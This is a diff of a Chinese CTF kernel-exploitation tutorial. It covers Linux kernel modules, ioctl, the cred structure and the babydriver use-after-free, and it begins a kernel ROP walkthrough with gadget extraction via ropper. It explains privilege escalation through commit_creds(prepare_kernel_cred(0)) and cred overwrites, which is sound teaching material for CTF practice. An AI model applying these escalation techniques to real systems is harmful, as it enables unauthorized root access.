@@ -43,7 +43,7 @@
 
 &lt;h3 id=&#34;kernel&#34;&gt;Kernel&lt;/h3&gt;
 
-&lt;p&gt;kernel 也是一个程序，用来管理软件发出的数据 I/O 要求，讲这些要求转义为指令，交给 CPU 和计算机中的其他组件处理，是现代操作系统最基本的部分。&lt;/p&gt;
+&lt;p&gt;kernel 也是一个程序，用来管理软件发出的数据 I/O 要求，讲这些要求转义为指令，交给 CPU 和计算机中的其他组件处理，kernel 是现代操作系统最基本的部分。&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&#34;https://upload.wikimedia.org/wikipedia/commons/8/8f/Kernel_Layout.svg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
 
@@ -82,7 +82,7 @@
 
 &lt;p&gt;LKMs 的文件格式和用户态的可执行程序相同，Linux 下为 ELF，Windows 下为 exe/dll，mac 下为 MACH-O，因此我们可以用 IDA 等工具来分析内核模块。&lt;/p&gt;
 
-&lt;h4 id=&#34;常用指令&#34;&gt;常用指令&lt;/h4&gt;
+&lt;h4 id=&#34;相关指令&#34;&gt;相关指令&lt;/h4&gt;
 
 &lt;ul&gt;
 &lt;li&gt;&lt;strong&gt;insmod&lt;/strong&gt;: 讲指定模块加载到内核中&lt;/li&gt;
@@ -91,7 +91,7 @@
 &lt;/ul&gt;
 
 &lt;blockquote&gt;
-&lt;p&gt;大多数　kernel vulnerability 也出在 LVM 中。&lt;/p&gt;
+&lt;p&gt;大多数　kernel vulnerability 也出在 LKM 中。&lt;/p&gt;
 &lt;/blockquote&gt;
 
 &lt;h3 id=&#34;syscall&#34;&gt;syscall&lt;/h3&gt;
@@ -101,7 +101,7 @@
 &lt;blockquote&gt;
 &lt;p&gt;在 &lt;em&gt;/usr/include/x86_64-linux-gnu/asm/unistd_64.h&lt;/em&gt; 和 &lt;em&gt;/usr/include/x86_64-linux-gnu/asm/unistd_32.h&lt;/em&gt; 分别可以查看 64 位和 32 位的系统调用号。&lt;/p&gt;
 
-&lt;p&gt;同时推荐一个很好用的网站 &lt;a href=&#34;https://syscalls.kernelgrok.com&#34;&gt;Linux Syscall Reference&lt;/a&gt;，可以查阅 32 位系统调用对应的寄存器含义以及源码。欢迎师傅们推荐 64 位类似功能的网站。&lt;/p&gt;
+&lt;p&gt;同时推荐一个很好用的网站 &lt;a href=&#34;https://syscalls.kernelgrok.com&#34;&gt;Linux Syscall Reference&lt;/a&gt;，可以查阅 32 位系统调用对应的寄存器含义以及源码。&lt;/p&gt;
 &lt;/blockquote&gt;
 
 &lt;h3 id=&#34;ioctl&#34;&gt;ioctl&lt;/h3&gt;
@@ -155,7 +155,9 @@ DESCRIPTION
        used in specifying an ioctl() request are located in the file &amp;lt;sys/ioctl.h&amp;gt;.&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;
-&lt;p&gt;可以看出 ioctl 也是一个系统调用，用于与设备通信，&lt;code&gt;int ioctl(int fd, unsigned long request, ...)&lt;/code&gt; 的第一个参数为打开设备 (open) 返回的 &lt;a href=&#34;http://m4x.fun/post/play-with-file-descriptor-1/&#34;&gt;文件描述符&lt;/a&gt;，第二个参数为用户程序对设备的控制命令，再后边的参数则是一些补充参数，与设备有关。&lt;/p&gt;
+&lt;p&gt;可以看出 ioctl 也是一个系统调用，用于与设备通信。&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;int ioctl(int fd, unsigned long request, ...)&lt;/code&gt; 的第一个参数为打开设备 (open) 返回的 &lt;a href=&#34;http://m4x.fun/post/play-with-file-descriptor-1/&#34;&gt;文件描述符&lt;/a&gt;，第二个参数为用户程序对设备的控制命令，再后边的参数则是一些补充参数，与设备有关。&lt;/p&gt;
 
 &lt;blockquote&gt;
 &lt;p&gt;使用 ioctl 进行通信的原因：&lt;/p&gt;
@@ -253,20 +255,109 @@ DESCRIPTION
 &lt;li&gt;通过 &lt;code&gt;sysretq&lt;/code&gt; 或者 &lt;code&gt;iretq&lt;/code&gt; 恢复到用户控件继续执行。如果使用 &lt;code&gt;iretq&lt;/code&gt; 还需要给出用户空间的一些信息（CS, eflags/rflags, esp/rsp 等）&lt;/li&gt;
 &lt;/ol&gt;
 
+&lt;h3 id=&#34;struct-cred&#34;&gt;struct cred&lt;/h3&gt;
+
+&lt;p&gt;之前提到 kernel 记录了进程的权限，更具体的，是用 cred 结构体记录的，每个进程中都有一个 cred 结构，这个结构保存了该进程的权限等信息（uid，gid 等），如果能修改某个进程的 cred，那么也就修改了这个进程的权限。&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://code.woboq.org/linux/linux/include/linux/cred.h.html#cred&#34;&gt;源码&lt;/a&gt; 如下:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-asm&#34; data-lang=&#34;asm&#34;&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-asm&#34; data-lang=&#34;asm&#34;&gt;&lt;span class=&#34;nf&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;cred&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;{&lt;/span&gt;
+	&lt;span class=&#34;nf&#34;&gt;atomic_t&lt;/span&gt;	&lt;span class=&#34;no&#34;&gt;usage&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;;
+&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#ifdef CONFIG_DEBUG_CREDENTIALS
+&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;no&#34;&gt;atomic_t&lt;/span&gt;	&lt;span class=&#34;no&#34;&gt;subscribers&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;;	/* number of processes subscribed */
+&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;no&#34;&gt;void&lt;/span&gt;		&lt;span class=&#34;p&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;put_addr&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;;
+&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;no&#34;&gt;unsigned&lt;/span&gt;	&lt;span class=&#34;no&#34;&gt;magic&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;;
+&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#define CRED_MAGIC	0x43736564
+&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#define CRED_MAGIC_DEAD	0x44656144
+&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#endif
+&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;no&#34;&gt;kuid_t&lt;/span&gt;		&lt;span class=&#34;no&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;;		/* real UID of the task */
+&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;no&#34;&gt;kgid_t&lt;/span&gt;		&lt;span class=&#34;no&#34;&gt;gid&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;;		/* real GID of the task */
+&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;no&#34;&gt;kuid_t&lt;/span&gt;		&lt;span class=&#34;no&#34;&gt;suid&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;;		/* saved UID of the task */
+&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;no&#34;&gt;kgid_t&lt;/span&gt;		&lt;span class=&#34;no&#34;&gt;sgid&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;;		/* saved GID of the task */
+&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;no&#34;&gt;kuid_t&lt;/span&gt;		&lt;span class=&#34;no&#34;&gt;euid&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;;		/* effective UID of the task */
+&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;no&#34;&gt;kgid_t&lt;/span&gt;		&lt;span class=&#34;no&#34;&gt;egid&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;;		/* effective GID of the task */
+&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;no&#34;&gt;kuid_t&lt;/span&gt;		&lt;span class=&#34;no&#34;&gt;fsuid&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;;		/* UID for VFS ops */
+&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;no&#34;&gt;kgid_t&lt;/span&gt;		&lt;span class=&#34;no&#34;&gt;fsgid&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;;		/* GID for VFS ops */
+&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;no&#34;&gt;unsigned&lt;/span&gt;	&lt;span class=&#34;no&#34;&gt;securebits&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;;	/* SUID-less security management */
+&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;no&#34;&gt;kernel_cap_t&lt;/span&gt;	&lt;span class=&#34;no&#34;&gt;cap_inheritable&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;; /* caps our children can inherit */
+&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;no&#34;&gt;kernel_cap_t&lt;/span&gt;	&lt;span class=&#34;no&#34;&gt;cap_permitted&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;;	/* caps we&amp;#39;re permitted */
+&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;no&#34;&gt;kernel_cap_t&lt;/span&gt;	&lt;span class=&#34;no&#34;&gt;cap_effective&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;;	/* caps we can actually use */
+&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;no&#34;&gt;kernel_cap_t&lt;/span&gt;	&lt;span class=&#34;no&#34;&gt;cap_bset&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;;	/* capability bounding set */
+&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;no&#34;&gt;kernel_cap_t&lt;/span&gt;	&lt;span class=&#34;no&#34;&gt;cap_ambient&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;;	/* Ambient capability set */
+&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#ifdef CONFIG_KEYS
+&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;no&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;char&lt;/span&gt;	&lt;span class=&#34;no&#34;&gt;jit_keyring&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;;	/* default keyring to attach requested
+&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;&lt;/span&gt;					 &lt;span class=&#34;p&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;keys&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;to&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;/&lt;/span&gt;
+	&lt;span class=&#34;nf&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;key&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;__rcu&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;session_keyring&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;; /* keyring inherited over fork */
+&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;no&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;key&lt;/span&gt;	&lt;span class=&#34;p&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;process_keyring&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;; /* keyring private to this process */
+&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;no&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;key&lt;/span&gt;	&lt;span class=&#34;p&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;thread_keyring&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;; /* keyring private to this thread */
+&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;no&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;key&lt;/span&gt;	&lt;span class=&#34;p&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;request_key_auth&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;; /* assumed request_key authority */
+&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#endif
+&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#ifdef CONFIG_SECURITY
+&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;no&#34;&gt;void&lt;/span&gt;		&lt;span class=&#34;p&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;security&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;;	/* subjective LSM security */
+&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#endif
+&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;no&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;user_struct&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;;	/* real user ID subscription */
+&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;no&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;user_namespace&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;user_ns&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;; /* user_ns the caps and keyrings are relative to. */
+&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;no&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;group_info&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;group_info&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;;	/* supplementary groups for euid/fsgid */
+&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;no&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;rcu_head&lt;/span&gt;	&lt;span class=&#34;no&#34;&gt;rcu&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;;		/* RCU deletion hook */
+&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;__randomize_layout&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;
 &lt;h3 id=&#34;内核态函数&#34;&gt;内核态函数&lt;/h3&gt;
 
 &lt;p&gt;相比用户态库函数，内核态的函数有了一些变化&lt;/p&gt;
 
 &lt;ul&gt;
-&lt;li&gt;printf()      -&amp;gt;      printk()，但需要注意的是 printk() 不一定会把内容显示到终端上，但一定在内核缓冲区里，可以通过 &lt;code&gt;dmesg&lt;/code&gt; 查看效果&lt;/li&gt;
-&lt;li&gt;memcpy()      -&amp;gt;      copy_from_user()/copy_to_user()
+&lt;li&gt;printf()      -&amp;gt;      &lt;strong&gt;printk()&lt;/strong&gt;，但需要注意的是 printk() 不一定会把内容显示到终端上，但一定在内核缓冲区里，可以通过 &lt;code&gt;dmesg&lt;/code&gt; 查看效果&lt;/li&gt;
+&lt;li&gt;memcpy()      -&amp;gt;      &lt;strong&gt;copy_from_user()/copy_to_user()&lt;/strong&gt;
 
 &lt;ul&gt;
 &lt;li&gt;copy_from_user() 实现了将用户空间的数据传送到内核空间&lt;/li&gt;
 &lt;li&gt;copy_to_user() 实现了将内核空间的数据传送到用户空间&lt;/li&gt;
 &lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;malloc()      -&amp;gt;      kmalloc()，内核态的内存分配函数，和 malloc() 相似，但使用的是 &lt;code&gt;slab/slub 分配器&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;free()        -&amp;gt;      kfree()，同 kmalloc()&lt;/li&gt;
+&lt;li&gt;malloc()      -&amp;gt;      &lt;strong&gt;kmalloc()&lt;/strong&gt;，内核态的内存分配函数，和 malloc() 相似，但使用的是 &lt;code&gt;slab/slub 分配器&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;free()        -&amp;gt;      &lt;strong&gt;kfree()&lt;/strong&gt;，同 kmalloc()&lt;/li&gt;
 &lt;/ul&gt;
 
 &lt;p&gt;另外要注意的是，&lt;code&gt;kernel 管理进程，因此 kernel 也记录了进程的权限&lt;/code&gt;。kernel 中有两个可以方便的改变权限的函数：&lt;/p&gt;
@@ -276,7 +367,7 @@ DESCRIPTION
 &lt;li&gt;&lt;strong&gt;struct cred* prepare_kernel_cred(struct task_struct* daemon)&lt;/strong&gt;&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;p&gt;从函数名也可以看出，执行 &lt;code&gt;commit_creds(prepare_kernel_cred(0))&lt;/code&gt; 即可获得 root 权限（root 的 uid，gid 均为 0&lt;/p&gt;
+&lt;p&gt;从函数名也可以看出，执行 &lt;code&gt;commit_creds(prepare_kernel_cred(0))&lt;/code&gt; 即可获得 root 权限（root 的 uid，gid 均为 0）&lt;/p&gt;
 
 &lt;p&gt;执行 &lt;code&gt;commit_creds(prepare_kernel_cred(0))&lt;/code&gt; 也是最常用的提权手段，两个函数的地址都可以在 &lt;code&gt;/proc/kallsyms&lt;/code&gt; 中查看&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
@@ -319,7 +410,7 @@ ffffffffbc7f06b7 r __kstrtab_prepare_kernel_cred&lt;/code&gt;&lt;/pre&gt;&lt;/td
 
 &lt;h3 id=&#34;ctf-kernel-pwn-相关&#34;&gt;CTF kernel pwn 相关&lt;/h3&gt;
 
-&lt;p&gt;一般会给以下三种文件&lt;/p&gt;
+&lt;p&gt;一般会给以下三个文件&lt;/p&gt;
 
 &lt;ol&gt;
 &lt;li&gt;boot.sh: 一个用于启动 kernel 的 shell 的脚本，多用 qemu，保护措施与 qemu 不同的启动参数有关&lt;/li&gt;
@@ -729,7 +820,7 @@ CISCN2017_babydriver &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;master●&lt;sp
 
 &lt;p&gt;也就是说如果我们同时打开两个设备，第二次会覆盖第一次分配的空间，因为 babydev_struct 是全局的。同样，如果释放第一个，那么第二个其实是被是释放过得，这样就造成了一个 UAF。&lt;/p&gt;
 
-&lt;p&gt;那么有了 UAF 要怎么用呢？之前提到 kernel 记录了进程的权限，更具体的，是用 cred 结构体记录的，每个进程中都有一个 cred 结构，这个结构保存了该进程的权限等信息（uid，gid 等），如果能修改某个进程的 cred，那么也就修改了这个进程的权限。&lt;/p&gt;
+&lt;p&gt;那么有了 UAF 要怎么用呢？根据之前的分析，可以修改进程的 cred 结构。&lt;/p&gt;
 
 &lt;p&gt;其中 4.4.72 的 cred 结构体 &lt;a href=&#34;https://bash-c.github.io/usr/src/linux-headers-4.15.0-29deepin/include/linux/compiler_types.h&#34;&gt;定义&lt;/a&gt; 如下：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
@@ -828,7 +919,7 @@ CISCN2017_babydriver &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;master●&lt;sp
 
 &lt;h4 id=&#34;exploit&#34;&gt;Exploit&lt;/h4&gt;
 
-&lt;p&gt;注释都写在代码里了，[download]()&lt;/p&gt;
+&lt;p&gt;注释都写在代码里了，&lt;a href=&#34;https://github.com/bash-c/pwn_repo/blob/master/CISCN2017_babydriver/exploit.c&#34;&gt;exploit here&lt;/a&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-C&#34; data-lang=&#34;C&#34;&gt;&lt;span class=&#34;lnt&#34;&gt; 1
@@ -1006,6 +1097,1398 @@ exploit
 
 &lt;h3 id=&#34;kernel-rop-2018强网杯-core&#34;&gt;kernel ROP - 2018强网杯 - core&lt;/h3&gt;
 
+&lt;h4 id=&#34;分析-1&#34;&gt;分析&lt;/h4&gt;
+
+&lt;p&gt;题目给了 &lt;code&gt;bzImage&lt;/code&gt;，&lt;code&gt;core.cpio&lt;/code&gt;，&lt;code&gt;start.sh&lt;/code&gt; 以及带符号表的 &lt;code&gt;vmlinux&lt;/code&gt; 四个文件&lt;/p&gt;
+
+&lt;p&gt;前三个文件我们已经知道了作用，&lt;code&gt;vmlinux&lt;/code&gt; 则是静态编译，未经过压缩的 kernel 文件，相对应的 &lt;code&gt;bzImage&lt;/code&gt; 可以理解为压缩后的文件，更详细的可以看 &lt;a href=&#34;https://unix.stackexchange.com/questions/5518/what-is-the-difference-between-the-following-kernel-makefile-terms-vmlinux-vml&#34;&gt;stackexchange&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;vmlinux 未经过压缩，也就是说我们可以从 vmlinux 中找到一些 gadget，我们先把 gadget 保存下来备用。&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;建议使用 &lt;a href=&#34;https://github.com/sashs/Ropper&#34;&gt;Ropper&lt;/a&gt; 来寻找 gadget，在我测试时，ropper 用了两分半钟提取出了所有的 gadget，而 &lt;a href=&#34;https://github.com/JonathanSalwan/ROPgadget&#34;&gt;ROPgadget&lt;/a&gt; 用了半个小时耗尽了内存还没跑出结果。。。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;give_to_player &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;master●&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;time&lt;/span&gt; ropper --file ./vmlinux --nocolor &amp;gt; g1
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;INFO&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Load gadgets from cache
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;LOAD&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; loading... &lt;span class=&#34;m&#34;&gt;100&lt;/span&gt;%
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;LOAD&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; removing double gadgets... &lt;span class=&#34;m&#34;&gt;100&lt;/span&gt;%
+ropper --file ./vmlinux --nocolor &amp;gt; g1  &lt;span class=&#34;m&#34;&gt;147&lt;/span&gt;.42s user &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt;.68s system &lt;span class=&#34;m&#34;&gt;111&lt;/span&gt;% cpu &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;:35.17 total
+
+give_to_player &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;master●&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;time&lt;/span&gt; ROPgadget --binary ./vmlinux &amp;gt; g2
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;    &lt;span class=&#34;m&#34;&gt;16597&lt;/span&gt; killed     ROPgadget --binary ./vmlinux &amp;gt; g2
+ROPgadget --binary ./vmlinux &amp;gt; g2  &lt;span class=&#34;m&#34;&gt;1064&lt;/span&gt;.39s user &lt;span class=&#34;m&#34;&gt;42&lt;/span&gt;.52s system &lt;span class=&#34;m&#34;&gt;54&lt;/span&gt;% cpu &lt;span class=&#34;m&#34;&gt;33&lt;/span&gt;:35.89 total&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;如果题目没有给 vmlinux，可以通过 &lt;a href=&#34;https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux&#34;&gt;extract-vmlinux&lt;/a&gt; 提取。&lt;/p&gt;
+
+&lt;p&gt;看一下 start.sh&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
